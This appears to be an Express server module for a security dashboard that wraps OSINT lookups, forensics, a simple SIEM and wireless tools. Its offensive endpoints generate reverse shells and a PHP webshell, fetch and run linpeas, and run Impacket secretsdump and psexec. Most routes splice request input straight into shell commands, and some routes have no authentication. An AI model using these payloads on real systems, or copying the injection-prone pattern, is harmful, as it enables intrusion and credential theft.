module.exports = function(app, requireAuth, run, fs, path, wss) {

const KEYS_FILE = path.join(__dirname, 'intel-keys.json');
function getKeys() { try { return JSON.parse(fs.readFileSync(KEYS_FILE, 'utf8')); } catch(e) { return {}; } }
function setKeys(keys) { fs.writeFileSync(KEYS_FILE, JSON.stringify({ ...getKeys(), ...keys }, null, 2)); }
app.get('/api/intel-keys', requireAuth, (_, res) => { const k = getKeys(), m = {}; for (const [key, val] of Object.entries(k)) m[key] = val ? val.substring(0,4)+'...'+val.substring(val.length-4) : ''; res.json(m); });
app.post('/api/intel-keys', requireAuth, (req, res) => { setKeys(req.body); res.json({ success: true }); });

// SHODAN
app.post('/api/infra/shodan/host', requireAuth, async (req, res) => {
    const key = getKeys().shodan;
    const ip = req.body.ip;
    if (key) {
        try { return res.json(JSON.parse(await run('curl -s "https://api.shodan.io/shodan/host/'+ip+'?key='+key+'"', 15000))); } catch(e) { return res.json({ error: e.message }); }
    }
    try { res.json(JSON.parse(await run('curl -s "https://internetdb.shodan.io/'+ip+'"', 15000))); } catch(e) { res.json({ error: e.message }); }
});
app.post('/api/infra/shodan/search', requireAuth, async (req, res) => { const key = getKeys().shodan; if (!key) return res.json({ error: 'No Shodan API key' }); try { res.json(JSON.parse(await run('curl -s "https://api.shodan.io/shodan/host/search?key='+key+'&query='+encodeURIComponent(req.body.query)+'"', 30000))); } catch(e) { res.json({ error: e.message }); } });
app.get('/api/infra/shodan/myip', requireAuth, async (_, res) => {
    const key = getKeys().shodan;
    if (key) { try { const ip = (await run('curl -s "https://api.shodan.io/tools/myip?key='+key+'"')).replace(/"/g,''); return res.json({ ip }); } catch(e) { return res.json({ error: e.message }); } }
    try { const ip = (await run('curl -s "https://icanhazip.com"')).trim(); res.json({ ip, source: 'free' }); } catch(e) { res.json({ error: e.message }); }
});

// VIRUSTOTAL

// SHODAN INTERNETDB (FREE - NO KEY)
app.post('/api/infra/internetdb', requireAuth, async (req, res) => { try { res.json(JSON.parse(await run('curl -s "https://internetdb.shodan.io/'+req.body.ip+'"', 15000))); } catch(e) { res.json({ error: e.message }); } });

// LEAKIX (FREE KEY - breach + service search)
app.post('/api/infra/leakix', requireAuth, async (req, res) => {
    const key = getKeys().leakix;
    const { q, scope, page } = req.body;
    const scopeVal = scope || 'service';
    const pageVal = page || 0;
    const url = 'https://leakix.net/search?scope='+scopeVal+'&page='+pageVal+'&q='+encodeURIComponent(q||'');
    const headers = key ? ' -H "api-key: '+key+'"' : '';
    try { res.json(JSON.parse(await run('curl -s -H "accept: application/json"'+headers+' "'+url+'"', 20000))); } catch(e) { res.json({ error: e.message }); }
});

// MALWAREEBAZAAR (FREE KEY - abuse.ch)
app.post('/api/infra/malwarebazaar', requireAuth, async (req, res) => {
    const key = getKeys().abuse_ch;
    if (!key) return res.json({ error: 'No abuse.ch key - get free at auth.abuse.ch' });
    const { hash } = req.body;
    try { res.json(JSON.parse(await run('curl -s -X POST "https://mb-api.abuse.ch/api/v1/" -d "query=get_info" -d "hash='+hash+'" -H "Auth-Key: '+key+'"', 15000))); } catch(e) { res.json({ error: e.message }); }
});

// URLHAUS (FREE KEY - same abuse.ch)
app.post('/api/infra/urlhaus', requireAuth, async (req, res) => {
    const key = getKeys().abuse_ch;
    if (!key) return res.json({ error: 'No abuse.ch key - get free at auth.abuse.ch' });
    const { url } = req.body;
    try { res.json(JSON.parse(await run('curl -s -X POST "https://urlhaus-api.abuse.ch/v1/url/" -d "url='+encodeURIComponent(url)+'" -H "Auth-Key: '+key+'"', 15000))); } catch(e) { res.json({ error: e.message }); }
});
app.post('/api/infra/virustotal/scan', requireAuth, async (req, res) => {
    const vtKey = getKeys().virustotal;
    const abuseKey = getKeys().abuse_ch;
    const { target, type } = req.body;
    if (vtKey) {
        let url; if (type==='ip') url='https://www.virustotal.com/api/v3/ip_addresses/'+target; else if (type==='domain') url='https://www.virustotal.com/api/v3/domains/'+target; else if (type==='hash') url='https://www.virustotal.com/api/v3/files/'+target; else return res.json({ error: 'Type: ip/domain/hash' });
        try { return res.json(JSON.parse(await run('curl -s "'+url+'" -H "x-apikey: '+vtKey+'"', 15000))); } catch(e) { return res.json({ error: e.message }); }
    }
    if (type==='hash' && abuseKey) {
        try { return res.json({ source: 'MalwareBazaar', ...JSON.parse(await run('curl -s -X POST "https://mb-api.abuse.ch/api/v1/" -d "query=get_info" -d "hash='+target+'" -H "Auth-Key: '+abuseKey+'"', 15000))}); } catch(e) { return res.json({ error: e.message }); }
    }
    return res.json({ error: 'No VirusTotal key. For hash lookup, add abuse.ch key (auth.abuse.ch)' });
});

// CERT TRANSPARENCY
app.post('/api/infra/crtsh', async (req, res) => { try { const d = await run('curl -s "https://crt.sh/?q=%25.'+req.body.domain+'&output=json" | head -c 100000', 30000); const c = JSON.parse(d||'[]'); res.json({ count: c.length, certificates: c.slice(0,100) }); } catch(e) { res.json({ error: e.message }); } });

// BGP/ASN
app.post('/api/infra/bgp', async (req, res) => { const ip = req.body.ip; try { const [asn, routing] = await Promise.all([run('curl -s "https://stat.ripe.net/data/prefix-overview/data.json?resource='+ip+'"', 15000), run('curl -s "https://stat.ripe.net/data/routing-status/data.json?resource='+ip+'"', 15000)]); res.json({ asn: JSON.parse(asn), routing: JSON.parse(routing) }); } catch(e) { res.json({ error: e.message }); } });

// DMARC/SPF/DKIM
app.post('/api/infra/dmarc', async (req, res) => { const d = req.body.domain; try { const [spf, dmarc, dkim, mx] = await Promise.all([run('dig +short TXT '+d+' | grep spf || echo "No SPF"'), run('dig +short TXT _dmarc.'+d+' || echo "No DMARC"'), run('dig +short TXT default._domainkey.'+d+' || echo "No DKIM"'), run('dig +short MX '+d+' || echo "No MX"')]); res.json({ spf, dmarc, dkim, mx, domain: d }); } catch(e) { res.json({ error: e.message }); } });

// SSL/SECURITY HEADERS
app.post('/api/infra/ssl', async (req, res) => { const h = req.body.host; try { const cert = await run('echo | openssl s_client -connect '+h+':443 -servername '+h+' 2>/dev/null | openssl x509 -noout -text 2>/dev/null | head -60', 15000); const hdr = await run('curl -sI "https://'+h+'" | head -30', 10000); const sec = {}; for (const x of ['strict-transport-security','content-security-policy','x-frame-options','x-content-type-options','x-xss-protection','referrer-policy','permissions-policy']) { const m = hdr.toLowerCase().match(new RegExp(x+':.*?(.+)', 'i')); sec[x] = m ? m[1].trim() : 'MISSING'; } res.json({ certificate: cert, securityHeaders: sec, rawHeaders: hdr }); } catch(e) { res.json({ error: e.message }); } });

// TECH DETECT
app.post('/api/infra/tech-detect', async (req, res) => { try { const hdr = await run('curl -sIL "'+req.body.url+'" | head -50', 15000); const body = await run('curl -sL "'+req.body.url+'" | head -300', 15000); const all=hdr+body, tech=[]; const checks=[[/wordpress|wp-content/i,'WordPress'],[/__NEXT|_next/i,'Next.js'],[/react/i,'React'],[/vue/i,'Vue.js'],[/angular/i,'Angular'],[/cloudflare/i,'Cloudflare'],[/nginx/i,'Nginx'],[/apache/i,'Apache'],[/php/i,'PHP'],[/laravel/i,'Laravel'],[/django/i,'Django'],[/shopify/i,'Shopify'],[/google-analytics|gtag/i,'Analytics'],[/cloudfront/i,'CloudFront'],[/x-amz/i,'AWS'],[/drupal/i,'Drupal']]; for(const [re,nm] of checks) if(re.test(all)) tech.push(nm); const srv=hdr.match(/server:s*(.+)/i); if(srv) tech.push('Server: '+srv[1].trim()); res.json({technologies:[...new Set(tech)],url:req.body.url}); } catch(e) { res.json({error:e.message}); } });

// COMINT: EMAIL HEADERS
app.post('/api/comint/email-headers', async (req, res) => {
    if (!req.body.headers) return res.json({ error: 'No headers' });
    const lines = req.body.headers.split('\n');
    const p = { received: [], from: '', to: '', subject: '', date: '', messageId: '', xMailer: '', ips: [], spf: '', dkim: '', dmarc: '' };
    for (const l of lines) {
        if (/^Received:/i.test(l)) p.received.push(l);
        if (/^From:/i.test(l)) p.from = l.replace(/^From:\s*/i, '');
        if (/^To:/i.test(l)) p.to = l.replace(/^To:\s*/i, '');
        if (/^Subject:/i.test(l)) p.subject = l.replace(/^Subject:\s*/i, '');
        if (/^Date:/i.test(l)) p.date = l.replace(/^Date:\s*/i, '');
        if (/^X-Mailer:/i.test(l)) p.xMailer = l.replace(/^X-Mailer:\s*/i, '');
        if (/spf=(\w+)/i.test(l)) p.spf = RegExp.$1;
        if (/dkim=(\w+)/i.test(l)) p.dkim = RegExp.$1;
        if (/dmarc=(\w+)/i.test(l)) p.dmarc = RegExp.$1;
        const ips = l.match(/\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/g);
        if (ips) p.ips.push(...ips.filter(ip => !/^(127\.|10\.|192\.168\.)/.test(ip)));
    }
    p.ips = [...new Set(p.ips)];
    p.hopsCount = p.received.length;
    res.json(p);
});
async function geoLookup(ip) {
    try {
        const j = JSON.parse(await run('curl -s "http://ip-api.com/json/'+ip+'?fields=status,country,countryCode,city,lat,lon,timezone,isp,org,as"', 5000));
        if (j.status === 'success') return { ip, ...j };
        throw new Error('ip-api failed');
    } catch (e) {
        const j = JSON.parse(await run('curl -s "https://reallyfreegeoip.org/json/'+ip+'"', 5000));
        return { ip, status: 'success', country: j.country_name, countryCode: j.country_code, city: j.city||'', lat: j.latitude, lon: j.longitude, timezone: j.time_zone||'', isp: '', org: '', as: '' };
    }
}
app.post('/api/geoint/ip-multi', async (req, res) => { if(!Array.isArray(req.body.ips)) return res.json({error:'Need array'}); try { const r=await Promise.allSettled(req.body.ips.slice(0,50).map(ip=>geoLookup(ip))); res.json(r.filter(x=>x.status==='fulfilled').map(x=>x.value)); } catch(e) { res.json({error:e.message}); } });

// GEOINT: TRACEROUTE WITH GEO
app.post('/api/geoint/traceroute-geo', async (req, res) => { try { const trace=await run('traceroute -n -m 20 '+req.body.host+' 2>/dev/null', 30000); const hops=[]; for(const l of trace.split('\n')){const m=l.match(/^\s*(\d+)\s+(\d+\.\d+\.\d+\.\d+)\s+(\S+)\s+ms/);if(m)hops.push({hop:+m[1],ip:m[2],rtt:+m[3]});} const geo=await Promise.allSettled(hops.map(async h=>{if(/^(10\.|192\.168\.|172\.)/.test(h.ip))return{...h,private:true};try{const g=await geoLookup(h.ip);return{...h,country:g.country,city:g.city,lat:g.lat,lon:g.lon,isp:g.isp};}catch(e){return h;}})); res.json({raw:trace,hops:geo.filter(r=>r.status==='fulfilled').map(r=>r.value)}); } catch(e) { res.json({error:e.message}); } });

// GEOINT: ADS-B
app.get('/api/geoint/adsb', async (_, res) => { try { const d=JSON.parse(await run('curl -s "https://opensky-network.org/api/states/all?lamin=25&lomin=-130&lamax=50&lomax=-60" | head -c 100000', 20000)||'{}'); const ac=(d.states||[]).slice(0,200).map(s=>({icao24:s[0],callsign:(s[1]||'').trim(),country:s[2],lat:s[6],lon:s[5],altitude:s[7],velocity:s[9],heading:s[10],onGround:s[8]})); res.json({aircraft:ac,time:d.time,count:ac.length}); } catch(e) { res.json({error:e.message}); } });

// DARKWEB
app.post('/api/darkweb/search', requireAuth, async (req, res) => {
    try {
        const q = encodeURIComponent(req.body.query);
        const cmd = 'curl -s "https://ahmia.fi/search/?q=' + q + '" 2>/dev/null';
        const html = await run(cmd, 30000);
        const matches = html.match(/https?:\/\/[a-zA-Z0-9._-]+\.onion[^"\s]*/g) || [];
        res.json({ results: [...new Set(matches)].slice(0, 20) });
    } catch(e) { res.json({ error: e.message }); }
});
app.post('/api/darkweb/crypto-trace', async (req, res) => { const {address,coin}=req.body; try { const url=coin==='eth'?'https://api.etherscan.io/api?module=account&action=txlist&address='+address+'&sort=desc&offset=10':'https://blockchain.info/rawaddr/'+address+'?limit=10'; res.json(JSON.parse(await run('curl -s "'+url+'"', 15000))); } catch(e) { res.json({error:e.message}); } });

// FORENSICS: CYBERCHEF
app.post('/api/forensics/cyberchef', requireAuth, async (req, res) => { let result=req.body.input; try { for(const op of req.body.operations){ switch(op.type){ case 'base64-encode':result=Buffer.from(result).toString('base64');break; case 'base64-decode':result=Buffer.from(result,'base64').toString('utf8');break; case 'hex-encode':result=Buffer.from(result).toString('hex');break; case 'hex-decode':result=Buffer.from(result,'hex').toString('utf8');break; case 'url-encode':result=encodeURIComponent(result);break; case 'url-decode':result=decodeURIComponent(result);break; case 'rot13':result=result.replace(/[a-zA-Z]/g,c=>String.fromCharCode((c<='Z'?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26));break; case 'reverse':result=result.split('').reverse().join('');break; case 'md5':result=require('crypto').createHash('md5').update(result).digest('hex');break; case 'sha256':result=require('crypto').createHash('sha256').update(result).digest('hex');break; case 'binary':result=result.split('').map(c=>c.charCodeAt(0).toString(2).padStart(8,'0')).join(' ');break; case 'xor':{const k=op.key||'A';result=result.split('').map((c,i)=>String.fromCharCode(c.charCodeAt(0)^k.charCodeAt(i%k.length))).join('');break;} case 'jwt-decode':{result=result.split('.').map((p,i)=>{try{return i<2?JSON.stringify(JSON.parse(Buffer.from(p,'base64url').toString()),null,2):p}catch(e){return p}}).join('\n---\n');break;} }} res.json({result}); } catch(e) { res.json({error:e.message}); } });

// FORENSICS: MALWARE SCAN
app.post('/api/forensics/malware-scan', requireAuth, async (req, res) => { const f=req.body.filePath; try { const [fi,hashes,str,elf]=await Promise.all([run('file "'+f+'"'),run('sha256sum "'+f+'" && md5sum "'+f+'" 2>/dev/null'),run('strings -n 6 "'+f+'" | head -50'),run('readelf -h "'+f+'" 2>/dev/null | head -20 || echo "Not ELF"')]); let vt=null; const sha256=(hashes.match(/^(\w{64})/m)||[])[1]; const vtKey=getKeys().virustotal; const abuseKey=getKeys().abuse_ch; if(vtKey&&sha256) try{vt=JSON.parse(await run('curl -s "https://www.virustotal.com/api/v3/files/'+sha256+'" -H "x-apikey: '+vtKey+'"', 15000));}catch(e){} else if(sha256&&abuseKey) try{vt={source:'MalwareBazaar',...JSON.parse(await run('curl -s -X POST "https://mb-api.abuse.ch/api/v1/" -d "query=get_info" -d "hash='+sha256+'" -H "Auth-Key: '+abuseKey+'"', 15000))};}catch(e){} res.json({fileInfo:fi,hashes,elfInfo:elf,virustotal:vt,suspiciousStrings:str.split('\n').filter(s=>/http|exec|eval|shell|password|token|secret/i.test(s)),allStrings:str.split('\n')}); } catch(e) { res.json({error:e.message}); } });

// FORENSICS: BROWSER HISTORY
app.post('/api/forensics/browser', requireAuth, async (req, res) => {
    const home = process.env.HOME;
    try {
        const chromeDb = home + '/.config/google-chrome/Default/History';
        const chromeCmd = 'sqlite3 "' + chromeDb + '" "SELECT url,title,visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 50" 2>/dev/null || echo "Chrome not found"';
        const ffCmd = 'find "' + home + '/.mozilla/firefox" -name "places.sqlite" 2>/dev/null | head -1 | xargs -I{} sqlite3 {} "SELECT url,title FROM moz_places ORDER BY last_visit_date DESC LIMIT 50" 2>/dev/null || echo "Firefox not found"';
        const [ch, ff] = await Promise.all([run(chromeCmd, 10000), run(ffCmd, 10000)]);
        res.json({ chrome: ch.split('\n'), firefox: ff.split('\n') });
    } catch(e) { res.json({ error: e.message }); }
});

app.post('/api/forensics/timeline', requireAuth, async (req, res) => { const h=req.body.hours||24,d=req.body.targetDir||'/home'; try { const [mod,acc,logins]=await Promise.all([run('find "'+d+'" -maxdepth 3 -mmin -'+h*60+' -type f 2>/dev/null | head -100'),run('find "'+d+'" -maxdepth 3 -amin -'+h*60+' -type f 2>/dev/null | head -50'),run('last -'+Math.min(h,168)+' 2>/dev/null | head -30')]); res.json({modified:mod.split('\n').filter(Boolean),accessed:acc.split('\n').filter(Boolean),logins:logins.split('\n').filter(Boolean),timeRange:h+'h'}); } catch(e) { res.json({error:e.message}); } });

// FORENSICS: SECURITY AUDIT
app.get('/api/forensics/security-audit', requireAuth, async (_, res) => { try { const [suid,ports,ssh,ufw,failSSH]=await Promise.all([run('find /usr/bin /usr/sbin /usr/local/bin -perm -4000 -type f 2>/dev/null | head -30'),run('ss -tlnp | grep LISTEN'),run('cat /etc/ssh/sshd_config | grep -v "^#" | grep -v "^$" | head -30 2>/dev/null'),run('sudo ufw status verbose 2>/dev/null || echo "UFW inactive"'),run('sudo journalctl -u sshd --since "24 hours ago" 2>/dev/null | grep -ic "failed" || echo "0"')]); const findings=[]; if(suid.split('\n').length>15)findings.push({severity:'medium',finding:suid.split('\n').length+' SUID binaries'}); if(parseInt(failSSH)>10)findings.push({severity:'high',finding:failSSH+' failed SSH/24h'}); if(/PermitRootLogins+yes/i.test(ssh))findings.push({severity:'critical',finding:'SSH root login on'}); const score=Math.max(0,100-findings.reduce((a,f)=>a+(f.severity==='critical'?25:f.severity==='high'?15:5),0)); res.json({suid:suid.split('\n').filter(Boolean),openPorts:ports.split('\n').filter(Boolean),sshConfig:ssh,firewall:ufw,failedLogins:parseInt(failSSH)||0,findings,score}); } catch(e) { res.json({error:e.message}); } });

// SIEM ENGINE
const siemAlerts=[]; const MAX_ALERTS=500;
function siemAlert(sev,src,msg,data){const a={id:Date.now()+'-'+Math.random().toString(36).substr(2,6),timestamp:new Date().toISOString(),severity:sev,source:src,message:msg,data:data||{}};siemAlerts.unshift(a);if(siemAlerts.length>MAX_ALERTS)siemAlerts.pop();wss.clients.forEach(ws=>{try{ws.send(JSON.stringify({type:'siem-alert',alert:a}));}catch(e){}});}
app.get('/api/siem/alerts', requireAuth, (req, res) => { let f=siemAlerts; if(req.query.severity)f=f.filter(a=>a.severity===req.query.severity); if(req.query.source)f=f.filter(a=>a.source===req.query.source); res.json(f.slice(0,parseInt(req.query.limit)||100)); });
app.get('/api/siem/stats', requireAuth, (_, res) => { const now=Date.now(),last24h=siemAlerts.filter(a=>now-new Date(a.timestamp).getTime()<86400000); const bySev={critical:0,high:0,medium:0,low:0,info:0},bySrc={}; for(const a of last24h){bySev[a.severity]=(bySev[a.severity]||0)+1;bySrc[a.source]=(bySrc[a.source]||0)+1;} res.json({total:last24h.length,bySeverity:bySev,bySource:bySrc}); });
let siemInterval=null;
app.post('/api/siem/start-monitor', requireAuth, async (_, res) => { if(siemInterval) return res.json({status:'already running'}); siemInterval=setInterval(async()=>{try{const f=await run('sudo journalctl -u sshd --since "2 minutes ago" --no-pager 2>/dev/null | grep -ic "failed" || echo "0"', 10000);if(parseInt(f)>3)siemAlert('high','ssh',f+' failed SSH in 2 min');const d=await run('df / | tail -1 | awk \'{print $5}\' | tr -d %');if(parseInt(d)>90)siemAlert('high','system','Disk: '+d+'%');}catch(e){}}, 30000); siemAlert('info','siem','SIEM started'); res.json({status:'started'}); });
app.post('/api/siem/stop-monitor', requireAuth, (_, res) => { if(siemInterval){clearInterval(siemInterval);siemInterval=null;} siemAlert('info','siem','SIEM stopped'); res.json({status:'stopped'}); });
app.post('/api/siem/threat-correlate', requireAuth, async (_, res) => { try { const [feed,conns]=await Promise.all([run('curl -s "https://feodotracker.abuse.ch/downloads/ipblocklist.txt" | grep -v "^#" | head -500'),run('ss -tn state established | tail -n+2 | awk "\047{print $5}\047" | cut -d: -f1 | sort -u')]); const threats=new Set(feed.split('\n').filter(l=>/^d/.test(l))),active=conns.split('\n').filter(Boolean),matches=active.filter(ip=>threats.has(ip)); if(matches.length) matches.forEach(ip=>siemAlert('critical','threat-intel','Threat IP: '+ip,{ip})); res.json({threatFeedSize:threats.size,activeConnections:active.length,matches}); } catch(e) { res.json({error:e.message}); } });

// OFFENSIVE: PAYLOAD GENERATOR
app.post('/api/offensive/payload-gen', requireAuth, async (req, res) => {
    const { type, lhost, lport } = req.body;
    const payloads = {
        'reverse-bash': 'bash -i >& /dev/tcp/' + lhost + '/' + lport + ' 0>&1',
        'reverse-nc': 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ' + lhost + ' ' + lport + ' >/tmp/f',
        'reverse-php': '<?php $sock=fsockopen("' + lhost + '",' + lport + ');exec("/bin/sh -i <&3 >&3 2>&3");?>',
        'webshell-php': '<?php if(isset($_REQUEST["cmd"])){system($_REQUEST["cmd"]);die;} ?>',
        'bind-nc': 'nc -lvnp ' + lport + ' -e /bin/sh'
    };
    const pyPayload = "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"" + lhost + "\"," + lport + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'";
    payloads['reverse-python'] = pyPayload;
    const psPayload = '$c=New-Object System.Net.Sockets.TCPClient("' + lhost + '",' + lport + ');$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length);$s.Flush()};$c.Close()';
    payloads['reverse-powershell'] = psPayload;
    if (!payloads[type]) return res.json({ error: 'Types: ' + Object.keys(payloads).join(', ') });
    res.json({ payload: payloads[type], type, lhost, lport });
});

// OFFENSIVE: LINPEAS
app.post('/api/offensive/linpeas', requireAuth, async (req, res) => { try { const s='/tmp/linpeas.sh'; if(!fs.existsSync(s)) await run('curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o '+s+' && chmod +x '+s, 30000); res.json({output:await run('bash '+s+' -q 2>&1 | head -500', 120000)}); } catch(e) { res.json({error:e.message}); } });

// OFFENSIVE: IMPACKET
app.post('/api/offensive/impacket', requireAuth, async (req, res) => { const {tool,target,user,pass,domain}=req.body; const t={'secretsdump':'impacket-secretsdump "'+(domain||'.')+'/'+user+':'+pass+'@'+target+'" 2>&1 | head -100','psexec':'impacket-psexec "'+(domain||'.')+'/'+user+':'+pass+'@'+target+'" whoami 2>&1','smbclient':'impacket-smbclient "'+(domain||'.')+'/'+user+':'+pass+'@'+target+'" -c "shares" 2>&1','wmiexec':'impacket-wmiexec "'+(domain||'.')+'/'+user+':'+pass+'@'+target+'" whoami 2>&1'}; if(!t[tool]) return res.json({error:'Tools: '+Object.keys(t).join(', ')}); try{res.json({output:await run(t[tool], 60000)});}catch(e){res.json({error:e.message});} });

// WIRELESS
app.post('/api/wireless/monitor-mode', requireAuth, async (req, res) => { const {iface,action}=req.body; try{let out; if(action==='start')out=await run('sudo airmon-ng start '+iface+' 2>&1');else if(action==='stop')out=await run('sudo airmon-ng stop '+iface+'mon 2>&1');else out=await run('sudo airmon-ng check '+iface+' 2>&1');res.json({output:out});}catch(e){res.json({error:e.message});} });
app.post('/api/wireless/probe-capture', requireAuth, async (req, res) => { const dur=Math.min(req.body.duration||10,30),iface=req.body.iface||'wlo1'; try{const out=await run('sudo timeout '+dur+' tshark -i '+iface+' -Y "wlan.fc.type_subtype == 0x04" -T fields -e wlan.sa -e wlan_mgt.ssid 2>/dev/null | sort -u | head -50', (dur+5)*1000);res.json({probes:out.split('\n').filter(Boolean).map(l=>{const p=l.split('	');return{mac:p[0],ssid:p[1]||'Broadcast'};}),duration:dur});}catch(e){res.json({error:e.message});} });
app.get('/api/wireless/rogue-detect', requireAuth, async (_, res) => { try { const nets=await run('nmcli -t -f BSSID,SSID,FREQ,SIGNAL,SECURITY dev wifi list 2>/dev/null'); const curSSID=(await run('nmcli -t -f active,ssid dev wifi | grep ^yes | cut -d: -f2')).trim(); const curBSSID=(await run('nmcli -t -f active,bssid dev wifi | grep ^yes | cut -d: -f2')).trim(); const all=nets.split('\n').filter(Boolean).map(l=>{const p=l.split(':');return{bssid:(p[0]||'').trim(),ssid:p[1],freq:p[2],signal:p[3],security:p[4]};}); const rogues=all.filter(n=>n.ssid===curSSID&&n.bssid!==curBSSID); res.json({currentSSID:curSSID,currentBSSID:curBSSID,allNetworks:all,rogueAPs:rogues,safe:rogues.length===0}); } catch(e) { res.json({error:e.message}); } });

};
